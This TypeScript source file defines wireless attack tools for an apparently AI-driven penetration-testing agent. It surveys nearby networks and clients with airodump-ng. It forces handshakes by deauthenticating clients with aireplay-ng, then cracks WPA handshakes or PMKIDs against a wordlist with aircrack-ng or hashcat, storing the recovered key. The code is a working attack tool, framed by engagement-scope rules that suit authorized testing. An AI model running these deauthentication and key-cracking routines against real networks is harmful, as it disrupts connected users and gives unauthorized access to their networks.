/**
 * Wireless engagement tools: RF survey and key recovery.
 *
 * Both tools drive the aircrack-ng suite against a monitor-mode adapter.
 * The survey parses the airodump-ng CSV so the transcript carries the
 * network inventory instead of raw capture noise, and the crack tool reports
 * a recovered key exactly once while the material itself stays on disk in
 * the engagement artifacts.
 */

import fs from "node:fs";
import path from "node:path";
import { Type } from "@earendil-works/pi-ai";
import type { ToolDefinition } from "@earendil-works/pi-coding-agent";
import { engagementPaths, ensureDir } from "../lib/config.ts";
import { run, which, type RunResult } from "../lib/exec.ts";
import { defineCyberTool, type CyberToolOutcome, type CyberToolSummary } from "../lib/toolkit.ts";

/** Default wordlist used when the operator does not name one. */
const DEFAULT_WORDLIST = "/usr/share/wordlists/rockyou.txt";
/** Default length of a passive survey, in seconds. */
const DEFAULT_SCAN_SECONDS = 30;
/** Default budget for a key recovery attempt, in seconds. */
const DEFAULT_CRACK_SECONDS = 300;
/** File stem used for the airodump-ng output prefix. */
const SCAN_FILE_STEM = "wireless-scan";
/** airodump-ng `--band` letter per requested band. */
const BAND_FLAGS: Record<string, string> = { "2.4": "bg", "5": "a" };
/** Frequency window (MHz) airodump-ng hops over for the 6 GHz band. */
const SIX_GHZ_FREQUENCIES = "5955-7125";
/** BSSID / station MAC pattern. */
const MAC_PATTERN = /^([0-9a-f]{2}:){5}[0-9a-f]{2}$/i;
/** Number of strongest networks reported by the survey. */
const STRONGEST_COUNT = 5;

/** An access point parsed from the airodump-ng CSV export. */
export interface WirelessAccessPoint {
	bssid: string;
	essid: string;
	channel: number;
	/** Average signal in dBm as reported by the capture. */
	signal: number;
	/** Privacy column, for example "WPA2" or "WPA2 WPA3". */
	encryption: string;
	/** Cipher column, for example "CCMP" or "TKIP". */
	cipher: string;
	/** Authentication column, for example "PSK" or "SAE". */
	authentication: string;
	beacons: number;
	dataPackets: number;
	firstSeen?: string;
	lastSeen?: string;
}

/** A station (client) parsed from the airodump-ng CSV export. */
export interface WirelessStation {
	mac: string;
	/** BSSID the station is associated with, when it is associated. */
	bssid?: string;
	associated: boolean;
	signal: number;
	packets: number;
	firstSeen?: string;
	lastSeen?: string;
	/** ESSIDs the station probed for. */
	probedEssids: string[];
}

/** Structured result of a wireless survey. */
export interface WirelessScanDetails {
	interface: string;
	band: string;
	durationSeconds: number;
	channel?: number;
	accessPoints: WirelessAccessPoint[];
	stations: WirelessStation[];
	encryptionTypes: Record<string, number>;
	csvPath?: string;
	capturePath?: string;
}

/** Structured result of a key recovery attempt. */
export interface WirelessCrackDetails {
	bssid: string;
	method: string;
	/** True when the tool produced or located a usable capture. */
	captured: boolean;
	/** Verdict on the handshake or PMKID material. */
	handshake: string;
	keyRecovered: boolean;
	/** File holding the recovered key. */
	keyArtifact?: string;
	/** File holding the capture that was cracked. */
	capturePath?: string;
	/** Commands that were executed, for the engagement record. */
	commands: string[];
	notes: string[];
}

/** Clamp a numeric parameter into a sane range. */
function clampNumber(value: number | undefined, fallback: number, min: number, max: number): number {
	if (value === undefined || !Number.isFinite(value)) return fallback;
	return Math.min(max, Math.max(min, Math.round(value)));
}

/** ISO timestamp that is safe to embed in a file name. */
function fileStamp(): string {
	return new Date().toISOString().replace(/[:.]/g, "-");
}

/** Undo the escaping airodump-ng applies to ESSIDs and other text fields. */
function unescapeCsvField(value: string): string {
	let output = "";
	for (let index = 0; index < value.length; index++) {
		const char = value[index];
		if (char !== "\\") {
			output += char;
			continue;
		}
		const next = value[++index];
		if (next === undefined) break;
		if (next === "n") output += "\n";
		else if (next === "t") output += "\t";
		else if (next === "r") output += "\r";
		else if (next === "x") {
			const code = Number.parseInt(value.slice(index + 1, index + 3), 16);
			if (Number.isFinite(code)) {
				output += String.fromCharCode(code);
				index += 2;
			} else {
				output += next;
			}
		} else {
			output += next;
		}
	}
	return output;
}

/** Split a CSV line without breaking escaped separators. */
function splitCsvLine(line: string): string[] {
	const fields: string[] = [];
	let current = "";
	for (let index = 0; index < line.length; index++) {
		const char = line[index];
		if (char === "\\" && index + 1 < line.length) {
			current += char + line[index + 1];
			index++;
			continue;
		}
		if (char === ",") {
			fields.push(current);
			current = "";
			continue;
		}
		current += char;
	}
	fields.push(current);
	return fields;
}

/** Parse an integer field, tolerating blank values. */
function parseNumber(value: string | undefined): number {
	if (value === undefined) return 0;
	const parsed = Number.parseInt(value.trim(), 10);
	return Number.isFinite(parsed) ? parsed : 0;
}

/**
 * Parse the CSV export airodump-ng writes next to the capture.
 *
 * The file holds two tables: the access point list
 * (BSSID, First time seen, Last time seen, channel, Speed, Privacy, Cipher,
 * Authentication, Power, # beacons, # IV, LAN IP, ID-length, ESSID, Key)
 * followed by the station list
 * (Station MAC, First time seen, Last time seen, Power, # packets, BSSID,
 * Probed ESSIDs).
 */
export function parseAirodumpCsv(text: string): { accessPoints: WirelessAccessPoint[]; stations: WirelessStation[] } {
	const accessPoints: WirelessAccessPoint[] = [];
	const stations: WirelessStation[] = [];
	const rows = text
		.split("\n")
		.map((line) => line.replace(/\r/g, "").trim())
		.filter((line) => line.length > 0);

	let section: "none" | "accessPoints" | "stations" = "none";
	for (const row of rows) {
		if (row.startsWith("BSSID,") || row.startsWith("Station MAC,")) {
			section = row.startsWith("Station MAC,") ? "stations" : "accessPoints";
			continue;
		}
		if (section === "accessPoints") {
			const fields = splitCsvLine(row);
			if (fields.length < 13) continue;
			const essid = fields.length > 15 ? fields.slice(13, fields.length - 1).join(",") : (fields[13] ?? "");
			accessPoints.push({
				bssid: (fields[0] ?? "").trim(),
				firstSeen: fields[1]?.trim(),
				lastSeen: fields[2]?.trim(),
				channel: parseNumber(fields[3]),
				encryption: unescapeCsvField((fields[5] ?? "").trim()),
				cipher: unescapeCsvField((fields[6] ?? "").trim()),
				authentication: unescapeCsvField((fields[7] ?? "").trim()),
				signal: parseNumber(fields[8]),
				beacons: parseNumber(fields[9]),
				dataPackets: parseNumber(fields[10]),
				essid: unescapeCsvField(essid.trim()),
			});
			continue;
		}
		if (section === "stations") {
			const fields = splitCsvLine(row);
			if (fields.length < 5) continue;
			const bssidField = (fields[5] ?? "").trim();
			const associated = !/^\(?not associated\)?$/i.test(bssidField) && bssidField.length > 0;
			const probed = fields
				.slice(6)
				.join(",")
				.split(",")
				.map((entry) => unescapeCsvField(entry.trim()))
				.filter((entry) => entry.length > 0);
			stations.push({
				mac: (fields[0] ?? "").trim(),
				firstSeen: fields[1]?.trim(),
				lastSeen: fields[2]?.trim(),
				signal: parseNumber(fields[3]),
				packets: parseNumber(fields[4]),
				bssid: associated ? bssidField : undefined,
				associated,
				probedEssids: probed,
			});
		}
	}

	return { accessPoints, stations };
}

/** Locate the newest airodump-ng output pair produced for a prefix. */
export function findAirodumpOutput(directory: string, stem: string): { csvPath?: string; capturePath?: string } {
	let entries: string[];
	try {
		entries = fs.readdirSync(directory);
	} catch {
		return {};
	}
	const pattern = new RegExp(`^${stem.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")}-(\\d+)\\.(csv|cap)$`);
	const buckets = new Map<string, { csvPath?: string; capturePath?: string; csvTime: number; capTime: number }>();
	for (const entry of entries) {
		const match = pattern.exec(entry);
		if (!match) continue;
		const full = path.join(directory, entry);
		let mtime = 0;
		try {
			mtime = fs.statSync(full).mtimeMs;
		} catch {
			continue;
		}
		const bucket = buckets.get(match[1]) ?? { csvTime: 0, capTime: 0 };
		if (match[2] === "csv") {
			bucket.csvPath = full;
			bucket.csvTime = mtime;
		} else {
			bucket.capturePath = full;
			bucket.capTime = mtime;
		}
		buckets.set(match[1], bucket);
	}

	let newestCsv: { path: string; time: number } | undefined;
	let newestCap: { path: string; time: number } | undefined;
	for (const bucket of buckets.values()) {
		if (bucket.csvPath && (!newestCsv || bucket.csvTime > newestCsv.time)) {
			newestCsv = { path: bucket.csvPath, time: bucket.csvTime };
		}
		if (bucket.capturePath && (!newestCap || bucket.capTime > newestCap.time)) {
			newestCap = { path: bucket.capturePath, time: bucket.capTime };
		}
	}
	return { csvPath: newestCsv?.path, capturePath: newestCap?.path };
}

/** Recover the `-w` prefix from a recorded command line. */
function prefixFromArgs(args: string[]): string | undefined {
	const index = args.indexOf("-w");
	if (index === -1 || index + 1 >= args.length) return undefined;
	return args[index + 1];
}

/** Build the airodump-ng arguments for the requested band and channel. */
function bandArgs(band: string, channel: number | undefined): string[] {
	if (channel !== undefined) return ["--channel", String(channel)];
	if (band === "6") return ["-C", SIX_GHZ_FREQUENCIES];
	return ["--band", BAND_FLAGS[band] ?? BAND_FLAGS["2.4"]];
}

/** Count how many networks use each encryption type. */
function countEncryption(accessPoints: WirelessAccessPoint[]): Record<string, number> {
	const counts: Record<string, number> = {};
	for (const accessPoint of accessPoints) {
		const label = accessPoint.encryption.length > 0 ? accessPoint.encryption : "unknown";
		counts[label] = (counts[label] ?? 0) + 1;
	}
	return counts;
}

/** Render the access point table for the transcript. */
function renderAccessPoints(accessPoints: WirelessAccessPoint[]): string {
	if (accessPoints.length === 0) return "  (no access points seen)";
	const header = ["  BSSID", "ESSID", "CH", "PWR", "ENC", "CIPHER"];
	const rows = accessPoints.map((accessPoint) => [
		`  ${accessPoint.bssid}`,
		` ${accessPoint.essid.length > 0 ? accessPoint.essid : "(hidden)"}`,
		` ${accessPoint.channel}`,
		` ${accessPoint.signal}`,
		` ${accessPoint.encryption.length > 0 ? accessPoint.encryption : "-"}`,
		` ${accessPoint.cipher.length > 0 ? accessPoint.cipher : "-"}`,
	]);
	const widths = header.map((cell, index) =>
		Math.max(cell.length, ...rows.map((row) => (row[index] ?? "").length)),
	);
	const render = (cells: string[]): string =>
		cells.map((cell, index) => cell.padEnd(widths[index])).join(" ").trimEnd();
	return [render(header), ...rows.map(render)].join("\n");
}

/** Copy a file into the engagement artifacts, ignoring failures. */
function copyToArtifacts(source: string, artifactsDir: string, name: string): string | undefined {
	try {
		ensureDir(artifactsDir);
		const destination = path.join(artifactsDir, name);
		fs.copyFileSync(source, destination);
		return destination;
	} catch {
		return undefined;
	}
}

/** Extract a key from an aircrack-ng or hashcat style transcript. */
function extractKey(text: string): string | undefined {
	const aircrack = /KEY FOUND!\s*\[\s*([^\]]+)\s*\]/i.exec(text);
	if (aircrack) return aircrack[1].trim();
	const password = /^\s*Password\s*:\s*(.+)$/im.exec(text);
	if (password) return password[1].trim();
	const cracked = /Status:\s*Cracked/im.exec(text);
	if (cracked) {
		const hashFound = /Hash found\s*:\s*(.+)$/im.exec(text);
		if (hashFound) return hashFound[1].trim();
	}
	return undefined;
}

/** Remove a recovered key from text that is about to enter the transcript. */
function redact(text: string, key: string | undefined): string {
	if (!key || key.length === 0) return text;
	return text.split(key).join("[redacted]");
}

/** Describe the handshake material aircrack-ng found in the capture. */
function aircrackVerdict(output: string): string {
	if (/No matching network found/i.test(output)) return "the target BSSID is not present in the capture";
	if (/Packets contained no EAPOL data/i.test(output)) return "the capture holds no EAPOL handshake";
	if (/No valid WPA handshakes found/i.test(output)) return "no usable WPA handshake in the capture";
	if (/An ESSID is required/i.test(output)) return "the access point hides its ESSID, aircrack-ng cannot target it by BSSID alone";
	if (/Please specify a dictionary/i.test(output)) return "aircrack-ng was not given a wordlist";
	if (/ERROR: Opening dictionary/i.test(output)) return "the wordlist could not be opened by aircrack-ng";
	return "a usable handshake was present, the wordlist did not contain the key";
}

/** Statistics about the hashes hcxpcapngtool extracted from a capture. */
interface HashStats {
	format: "hash" | "pcapng" | "empty";
	pmkid: number;
	eapol: number;
}

/** Inspect the file hcxpcapngtool produced. */
function inspectHashOutput(file: string): HashStats {
	let content: Buffer;
	try {
		content = fs.readFileSync(file);
	} catch {
		return { format: "empty", pmkid: 0, eapol: 0 };
	}
	if (content.length === 0) return { format: "empty", pmkid: 0, eapol: 0 };
	const isPcapng = content.length >= 4 && content[0] === 0x0a && content[1] === 0x0d && content[2] === 0x0d && content[3] === 0x0a;
	if (isPcapng) return { format: "pcapng", pmkid: 0, eapol: 0 };
	const text = content.toString("utf8");
	let pmkid = 0;
	let eapol = 0;
	for (const line of text.split("\n")) {
		const trimmed = line.trim();
		if (trimmed.startsWith("WPA*01")) pmkid++;
		else if (trimmed.startsWith("WPA*02")) eapol++;
	}
	return { format: "hash", pmkid, eapol };
}

/** Run a command inside the engagement, capturing the output. */
function runCommand(bin: string, args: string[], cwd: string, timeoutMs: number): Promise<RunResult> {
	return run(bin, args, { cwd, timeoutMs, maxBytes: 64_000 });
}

/** Wait for a number of milliseconds. */
function sleep(ms: number): Promise<void> {
	return new Promise((resolve) => setTimeout(resolve, ms));
}

/**
 * Capture a fresh handshake for an access point.
 *
 * The channel of the access point is discovered first, then the adapter is
 * locked to it while the clients are deauthenticated so the association
 * (and with it the handshake) is repeated.
 */
async function captureHandshake(
	bssid: string,
	iface: string,
	workDir: string,
	budget: number,
	commands: string[],
	notes: string[],
): Promise<string | undefined> {
	const discoveryPrefix = path.join(workDir, `${bssid.replace(/:/g, "")}-discovery`);
	const discovery = await runCommand(
		"timeout",
		["--signal=INT", "--kill-after=10", "25s", "airodump-ng", "--band", "ab", "--bssid", bssid, "-w", discoveryPrefix, iface],
		workDir,
		60_000,
	);
	commands.push(discovery.cmd);
	const discoveryFiles = findAirodumpOutput(workDir, path.basename(discoveryPrefix));
	let channel: number | undefined;
	if (discoveryFiles.csvPath) {
		try {
			const parsed = parseAirodumpCsv(fs.readFileSync(discoveryFiles.csvPath, "utf8"));
			channel = parsed.accessPoints[0]?.channel;
		} catch {
			channel = undefined;
		}
	}
	if (channel === undefined) {
		notes.push(`${bssid} was not seen during the channel discovery pass`);
		return undefined;
	}

	const capturePrefix = path.join(workDir, `${bssid.replace(/:/g, "")}-handshake`);
	const captureSeconds = Math.min(60, Math.max(20, Math.round(budget / 4)));
	const capturePromise = runCommand(
		"timeout",
		[
			"--signal=INT",
			"--kill-after=10",
			`${captureSeconds}s`,
			"airodump-ng",
			"--bssid",
			bssid,
			"--channel",
			String(channel),
			"-w",
			capturePrefix,
			iface,
		],
		workDir,
		(captureSeconds + 20) * 1000,
	);
	await sleep(2000);
	const deauth = await runCommand("aireplay-ng", ["-0", "5", "-a", bssid, iface], workDir, 60_000);
	commands.push(deauth.cmd);
	const capture = await capturePromise;
	commands.push(capture.cmd);

	const files = findAirodumpOutput(workDir, path.basename(capturePrefix));
	if (files.capturePath) return files.capturePath;
	notes.push(`the capture ran but produced no packet file for ${bssid}`);
	return undefined;
}

/**
 * Crack a PMKID capture with hcxhashcat or hashcat.
 *
 * `hcxhashcat` reads the capture directly. `hashcat` needs the hashcat
 * 22000 file that hcxpcapngtool produces, so the conversion output is
 * reused instead of running the tool twice.
 */
async function crackPmkid(
	capture: string,
	hashOutput: string,
	stats: HashStats,
	workDir: string,
	wordlist: string,
	budget: number,
	keyArtifact: string,
	commands: string[],
	transcript: string[],
	notes: string[],
): Promise<{ key?: string; verdict: string }> {
	const hcxhashcat = which("hcxhashcat");
	const hashcat = which("hashcat");
	let result: RunResult | undefined;

	if (hcxhashcat) {
		const attack = await runCommand("hcxhashcat", ["-w", wordlist, capture], workDir, budget * 1000);
		commands.push(attack.cmd);
		transcript.push(`$ ${attack.cmd}\n${attack.stdout}${attack.stderr}`);
		result = attack;
	} else if (hashcat) {
		let hashFile = hashOutput;
		if (stats.format !== "hash") {
			// Older hcxpcapngtool releases write a pcapng, convert it again.
			hashFile = path.join(workDir, "pmkid.22000");
			const conversion = await runCommand("hcxpcapngtool", ["-o", hashFile, hashOutput], workDir, Math.min(budget * 1000, 120_000));
			commands.push(conversion.cmd);
			transcript.push(`$ ${conversion.cmd}\n${conversion.stdout}${conversion.stderr}`);
			if (inspectHashOutput(hashFile).format !== "hash") {
				notes.push("hcxpcapngtool did not produce a hashcat 22000 file from the capture");
				return { verdict: "no PMKID hash could be extracted from the capture" };
			}
		}
		const attack = await runCommand("hashcat", ["-m", "22000", hashFile, wordlist], workDir, budget * 1000);
		commands.push(attack.cmd);
		transcript.push(`$ ${attack.cmd}\n${attack.stdout}${attack.stderr}`);
		result = attack;
	} else {
		notes.push("neither hcxhashcat nor hashcat is installed, so the PMKID cannot be cracked");
		return { verdict: "no cracking tool available" };
	}

	const combined = `${result.stdout}\n${result.stderr}`;
	const key = extractKey(combined);
	if (key !== undefined) {
		try {
			fs.writeFileSync(keyArtifact, `${key}\n`, "utf8");
		} catch {
			notes.push(`could not write the recovered key to ${keyArtifact}`);
		}
	}
	const exhausted = /Status:\s*Exhausted/i.test(combined) || /No hashes/i.test(combined);
	return {
		key,
		verdict:
			key !== undefined
				? "PMKID cracked"
				: exhausted
					? "PMKID present, key not in the wordlist"
					: "PMKID present, no key recovered",
	};
}

/** Read the key aircrack-ng wrote with `-l`. */
function readKeyFile(file: string): string | undefined {
	try {
		const content = fs.readFileSync(file, "utf8").trim();
		return content.length > 0 ? content : undefined;
	} catch {
		return undefined;
	}
}

export const wirelessTools: ToolDefinition[] = [
	defineCyberTool({
		name: "cyber_wireless_scan",
		label: "Wireless survey",
		description:
			"Survey the wireless environment around a monitor-mode adapter with airodump-ng. " +
			"Parses the capture into an access point list and a client list and reports the " +
			"encryption in use and the strongest networks.",
		promptSnippet: "cyber_wireless_scan: survey nearby wireless networks on a monitor-mode adapter",
		promptGuidelines: [
			"Wireless tools need a monitor-mode adapter: the operator must put the adapter into monitor mode first (for example sudo airmon-ng start wlan0) and pass the resulting monitor-mode interface name.",
			"cyber_wireless_crack additionally requires the target BSSID to be listed in .cyberpi/scope.json, because it attacks one specific access point.",
		],
		technique: "wireless",
		requires: ["airodump-ng"],
		parameters: Type.Object({
			interface: Type.String({ description: "Monitor-mode interface to survey, for example wlan0mon" }),
			band: Type.Optional(
				Type.Enum(["2.4", "5", "6"], {
					description: "Frequency band to survey",
					default: "2.4",
				}),
			),
			duration_seconds: Type.Optional(
				Type.Number({ description: "Length of the capture in seconds", default: DEFAULT_SCAN_SECONDS }),
			),
			channel: Type.Optional(Type.Number({ description: "Fix the adapter to this channel instead of hopping" })),
			output_dir: Type.Optional(Type.String({ description: "Directory for the capture files, defaults to the engagement artifacts" })),
		}),
		build: (params, ctx) => {
			const paths = engagementPaths(ctx.cwd);
			const outputDir = params.output_dir ? path.resolve(params.output_dir) : paths.artifacts;
			ensureDir(outputDir);
			const duration = clampNumber(params.duration_seconds, DEFAULT_SCAN_SECONDS, 5, 3600);
			const prefix = path.join(outputDir, SCAN_FILE_STEM);
			return {
				bin: "timeout",
				args: [
					"--signal=INT",
					"--kill-after=10",
					`${duration}s`,
					"airodump-ng",
					...bandArgs(params.band ?? "2.4", params.channel),
					"-w",
					prefix,
					params.interface,
				],
				cwd: outputDir,
				label: SCAN_FILE_STEM,
				timeoutMs: duration * 1000 + 20_000,
			};
		},
		summarize: (results, params): CyberToolSummary<WirelessScanDetails> => {
			const result = results[0];
			const duration = clampNumber(params.duration_seconds, DEFAULT_SCAN_SECONDS, 5, 3600);
			const band = params.band ?? "2.4";
			if (!result) {
				return {
					summary: "Wireless survey did not run",
					details: { interface: params.interface, band, durationSeconds: duration, accessPoints: [], stations: [], encryptionTypes: {} },
					severity: "medium",
					output: "",
					isError: true,
				};
			}

			const prefix = prefixFromArgs(result.args);
			const outputDir = prefix ? path.dirname(prefix) : process.cwd();
			const stem = prefix ? path.basename(prefix) : SCAN_FILE_STEM;
			const files = findAirodumpOutput(outputDir, stem);

			let csvText = "";
			if (files.csvPath) {
				try {
					csvText = fs.readFileSync(files.csvPath, "utf8");
				} catch {
					csvText = "";
				}
			}
			const { accessPoints, stations } = parseAirodumpCsv(csvText);
			const encryptionTypes = countEncryption(accessPoints);
			const strongest = [...accessPoints].sort((left, right) => right.signal - left.signal).slice(0, STRONGEST_COUNT);

			const artifactsDir = result.artifact ? path.dirname(result.artifact) : engagementPaths(process.cwd()).artifacts;
			const stamp = fileStamp();
			const captureArtifact = files.capturePath
				? (path.dirname(files.capturePath) === artifactsDir
					? files.capturePath
					: (copyToArtifacts(files.capturePath, artifactsDir, `wireless-scan-${stamp}.cap`) ?? files.capturePath))
				: undefined;
			const csvArtifact = files.csvPath
				? (path.dirname(files.csvPath) === artifactsDir
					? files.csvPath
					: (copyToArtifacts(files.csvPath, artifactsDir, `wireless-scan-${stamp}.csv`) ?? files.csvPath))
				: undefined;

			// `timeout` reports 124 when it stops the capture on purpose.
			const failed = result.code !== 0 && result.code !== 124;
			const encryptionSummary = Object.entries(encryptionTypes)
				.map(([label, count]) => `${label} (${count})`)
				.join(", ");

			const body: string[] = [];
			body.push(`Access points: ${accessPoints.length}`);
			body.push(`Clients (stations): ${stations.length}`);
			body.push(`Encryption seen: ${encryptionSummary.length > 0 ? encryptionSummary : "none"}`);
			body.push("");
			body.push("Strongest networks:");
			body.push(renderAccessPoints(strongest));
			if (stations.length > 0) {
				body.push("");
				body.push("Clients:");
				for (const station of stations.slice(0, STRONGEST_COUNT * 2)) {
					body.push(
						`  ${station.mac}  ${station.associated ? station.bssid : "(not associated)"}  ${station.signal} dBm  ${station.packets} pkts`,
					);
				}
			}
			if (files.capturePath) body.push("", `Capture: ${captureArtifact ?? files.capturePath}`);
			if (files.csvPath) body.push(`Capture table: ${csvArtifact ?? files.csvPath}`);
			body.push(`Artifacts: ${artifactsDir}`);
			if (failed) {
				body.push("", `airodump-ng exited with code ${result.code}.`, result.stderr.trim());
			}

			const summary = failed
				? `Wireless survey on ${params.interface} failed (airodump-ng exit ${result.code})`
				: `Wireless survey on ${params.interface} (${band} GHz, ${duration}s): ${accessPoints.length} access points, ${stations.length} clients`;

			return {
				summary,
				details: {
					interface: params.interface,
					band,
					durationSeconds: duration,
					channel: params.channel,
					accessPoints,
					stations,
					encryptionTypes,
					csvPath: csvArtifact,
					capturePath: captureArtifact,
				},
				severity: failed ? "medium" : "info",
				output: body.join("\n"),
				isError: failed,
			};
		},
	}),
	defineCyberTool({
		name: "cyber_wireless_crack",
		label: "Wireless key recovery",
		description:
			"Recover the key of a wireless access point from a captured handshake or PMKID. " +
			"Uses hcxpcapngtool/hcxhashcat for PMKID captures and aircrack-ng for EAPOL handshakes. " +
			"The recovered key is reported once and stored in the engagement artifacts.",
		promptSnippet: "cyber_wireless_crack: recover the key of a scoped access point from a handshake or PMKID capture",
		promptGuidelines: [
			"Wireless tools need a monitor-mode adapter: the operator must put the adapter into monitor mode first (for example sudo airmon-ng start wlan0) and pass the resulting monitor-mode interface name.",
			"cyber_wireless_crack attacks one specific access point, so its BSSID has to be listed in .cyberpi/scope.json before the tool will touch it.",
		],
		technique: "wireless",
		requires: ["aircrack-ng"],
		parameters: Type.Object({
			target: Type.String({ description: "BSSID of the access point, for example AA:BB:CC:DD:EE:FF" }),
			interface: Type.Optional(Type.String({ description: "Monitor-mode interface used to capture a handshake when none is supplied" })),
			handshake_capture: Type.Optional(Type.String({ description: "Path to a captured handshake (.cap or .pcapng)" })),
			wordlist: Type.Optional(Type.String({ description: "Wordlist used for the attack", default: DEFAULT_WORDLIST })),
			method: Type.Optional(
				Type.Enum(["auto", "pmkid", "wpa", "wpa2"], {
					description: "Attack method: auto inspects the capture and picks the best one",
					default: "auto",
				}),
			),
			timeout: Type.Optional(Type.Number({ description: "Attack budget in seconds", default: DEFAULT_CRACK_SECONDS })),
		}),
		target: (params) => params.target,
		execute: async (params, ctx): Promise<CyberToolOutcome<WirelessCrackDetails>> => {
			const bssid = params.target.trim().toUpperCase();
			const method = params.method ?? "auto";
			const wordlist = params.wordlist ?? DEFAULT_WORDLIST;
			const budget = clampNumber(params.timeout, DEFAULT_CRACK_SECONDS, 10, 86_400);
			const paths = engagementPaths(ctx.cwd);
			const artifactsDir = paths.artifacts;
			ensureDir(artifactsDir);
			const workDir = path.join(artifactsDir, "wireless-crack");
			ensureDir(workDir);

			const commands: string[] = [];
			const notes: string[] = [];
			const details: WirelessCrackDetails = {
				bssid,
				method,
				captured: false,
				handshake: "not attempted",
				keyRecovered: false,
				commands,
				notes,
			};

			const fail = (summary: string, severity: "info" | "low" | "medium" | "high" = "medium"): CyberToolOutcome<WirelessCrackDetails> => ({
				summary,
				details,
				severity: severity,
				output: notes.length > 0 ? notes.join("\n") : undefined,
				isError: true,
			});

			if (!MAC_PATTERN.test(bssid)) {
				return fail(`target "${params.target}" is not a BSSID; use the AA:BB:CC:DD:EE:FF form`);
			}
			if (!fs.existsSync(wordlist)) {
				return fail(`wordlist ${wordlist} does not exist; pass an existing wordlist or install rockyou`);
			}

			// Resolve the capture: use the supplied one, or capture a fresh handshake.
			const supplied = params.handshake_capture ? path.resolve(params.handshake_capture) : undefined;
			if (supplied !== undefined && !fs.existsSync(supplied)) {
				return fail(`handshake capture ${params.handshake_capture} does not exist`);
			}
			let capture: string | undefined = supplied;

			if (capture === undefined) {
				if (!params.interface) {
					return fail("handshake_capture is required unless an interface is given so the tool can capture one");
				}
				if (!which("aireplay-ng")) {
					return fail("aireplay-ng is not installed; install aircrack-ng or supply a handshake_capture");
				}
				const captured = await captureHandshake(bssid, params.interface, workDir, budget, commands, notes);
				if (!captured) {
					return fail(`no handshake could be captured for ${bssid} on ${params.interface}`);
				}
				capture = captured;
			}
			details.captured = true;
			details.capturePath = capture;

			const transcript: string[] = [];
			const stamp = fileStamp();
			const keyArtifact = path.join(artifactsDir, `wireless-crack-${bssid.replace(/:/g, "")}-${stamp}.key`);
			const captureArtifact = path.join(artifactsDir, `wireless-crack-${bssid.replace(/:/g, "")}-${stamp}.cap`);
			try {
				fs.copyFileSync(capture, captureArtifact);
				details.capturePath = captureArtifact;
			} catch {
				notes.push(`could not copy the capture to ${captureArtifact}`);
			}

			let key: string | undefined;

			// A PMKID is only usable when the capture actually carries one, so the
			// capture is inspected before the attack method is chosen.
			let stats: HashStats = { format: "empty", pmkid: 0, eapol: 0 };
			const hashOutput = path.join(workDir, `${bssid.replace(/:/g, "")}-${stamp}.out`);
			const hcxpcapngtool = which("hcxpcapngtool");
			if (hcxpcapngtool) {
				const conversion = await runCommand(
					"hcxpcapngtool",
					["-o", hashOutput, capture],
					workDir,
					Math.min(budget * 1000, 120_000),
				);
				commands.push(conversion.cmd);
				transcript.push(`$ ${conversion.cmd}\n${conversion.stdout}${conversion.stderr}`);
				stats = inspectHashOutput(hashOutput);
			} else {
				notes.push("hcxpcapngtool is not installed, falling back to the aircrack-ng handshake attack");
			}

			let attackMethod: "pmkid" | "handshake" = "handshake";
			if (method === "pmkid" || (method === "auto" && stats.pmkid > 0)) {
				if (!hcxpcapngtool) {
					return fail("hcxpcapngtool is required for a PMKID attack; install hcxtools");
				}
				if (stats.pmkid === 0) {
					if (method === "pmkid") {
						return fail(`the capture holds no PMKID for ${bssid}; capture one with hcxpcapngtool or use method wpa/wpa2`);
					}
				} else {
					attackMethod = "pmkid";
				}
			}

			if (attackMethod === "pmkid") {
				const cracked = await crackPmkid(
					capture,
					hashOutput,
					stats,
					workDir,
					wordlist,
					budget,
					keyArtifact,
					commands,
					transcript,
					notes,
				);
				key = cracked.key;
				details.handshake = `PMKID material present (${stats.pmkid} PMKID, ${stats.eapol} EAPOL)`;
				if (key === undefined) details.handshake = `${details.handshake}, ${cracked.verdict}`;
			} else {
				const attack = await runCommand(
					"aircrack-ng",
					["-a", "2", "-b", bssid, "-w", wordlist, "-l", keyArtifact, capture],
					workDir,
					budget * 1000,
				);
				commands.push(attack.cmd);
				transcript.push(`$ ${attack.cmd}\n${attack.stdout}${attack.stderr}`);
				const combined = `${attack.stdout}\n${attack.stderr}`;
				key = extractKey(combined) ?? readKeyFile(keyArtifact);
				details.handshake =
					key !== undefined ? "a usable handshake was present and the key was recovered" : aircrackVerdict(combined);
			}

			details.keyRecovered = key !== undefined;
			details.keyArtifact = key !== undefined ? keyArtifact : undefined;

			const transcriptPath = path.join(artifactsDir, `wireless-crack-${bssid.replace(/:/g, "")}-${stamp}.txt`);
			try {
				ensureDir(artifactsDir);
				fs.writeFileSync(transcriptPath, transcript.join("\n\n"), "utf8");
			} catch {
				notes.push(`could not write the command transcript to ${transcriptPath}`);
			}

			const safeTranscript = redact(transcript.join("\n\n"), key);
			const body: string[] = [];
			body.push(`Target: ${bssid}`);
			body.push(`Method: ${method === "auto" ? `auto (${attackMethod})` : method}`);
			body.push(`Capture: ${details.capturePath ?? capture}`);
			body.push(`Handshake: ${details.handshake}`);
			body.push(`Wordlist: ${wordlist}`);
			body.push(`Command transcript: ${transcriptPath}`);
			if (key !== undefined) {
				body.push(`Recovered key: stored in ${keyArtifact}`);
			} else {
				body.push("No key was recovered.");
			}
			if (notes.length > 0) body.push("", ...notes);

			const summary =
				key !== undefined
					? `Recovered the key for ${bssid}: ${key}`
					: `No key recovered for ${bssid} (${details.handshake})`;

			return {
				summary,
				details,
				severity: key !== undefined ? "high" : "low",
				output: `${body.join("\n")}\n\n${safeTranscript}`,
				isError: false,
			};
		},
	}),
];
